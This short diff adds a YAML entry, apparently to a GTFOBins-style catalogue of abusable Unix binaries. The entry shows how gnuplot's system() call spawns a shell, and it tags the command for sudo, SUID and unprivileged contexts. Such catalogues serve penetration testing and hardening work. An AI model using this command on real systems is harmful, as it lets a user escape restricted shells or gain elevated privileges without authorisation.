@@ -1,0 +1,11 @@
+---
+functions:
+  shell:
+  - code: |-
+      gnuplot -e 'system("/bin/sh 1>&0")'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
